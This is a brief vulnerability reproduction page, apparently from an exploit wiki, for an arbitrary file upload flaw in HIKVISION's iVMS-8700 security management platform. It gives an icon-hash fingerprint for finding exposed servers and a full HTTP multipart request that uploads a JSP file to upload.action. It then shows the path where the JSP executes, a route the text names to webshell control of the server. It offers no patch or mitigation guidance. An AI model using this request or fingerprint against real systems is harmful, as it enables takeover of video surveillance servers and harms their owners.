# HIKVISION iVMS-8700 Comprehensive Security Management Platform upload.action any file upload

## Vulnerability Description

There is a vulnerability to upload any file in the HIKVISION iVMS-8700 comprehensive security management platform. The attacker can upload the Webshell file to control the server by sending a specific request package.

## Vulnerability Impact

<span style="background-color:rgb(18, 160, 255); padding: 2px 4px; border-radius: 3px; color: white;">HIKVISION iVMS-8700 Comprehensive Security Management Platform</span>

## Network surveying and mapping

<span style="background-color:rgb(18, 160, 255); padding: 2px 4px; border-radius: 3px; color: white;">icon_hash="-911494769"</span>

## Vulnerability reappears

Login page

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1637649859645-abee2ae8-c4e5-46a1-b50e-54f9b7e7c019-20230622122052279.png)

Send request package to upload file

```python
POST /eps/resourceOperations/upload.action HTTP/1.1
Host: 
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: MicroMessenger
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: ISMS_8700_Sessionname=CA0F207A6372FE883ACA78B74E6DC953; CAS-USERNAME=058; ISMS_8700_Sessionname=4D808BE7BE0E5C7047B9688E6009F710
Connection: close
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryTJyhtTNqdMNLZLhj
Content-Length: 212

------WebKitFormBoundaryTJyhtTNqdMNLZLhj
Content-Disposition: form-data; name="fileUploader";filename="test.jsp"
Content-Type: image/jpeg

<%out.print("hello");%>
------WebKitFormBoundaryTJyhtTNqdMNLZLhj--
```

Upload path

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1684382043879-83c87924-60a0-40d2-a8b4-54210e068734.png)

```python
/eps/upload/769badc8ef5944da804a4ca3c8ecafb0.jsp
```

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1684382084856-9d10ea21-17af-4290-89ed-76420b8b3cd9.png)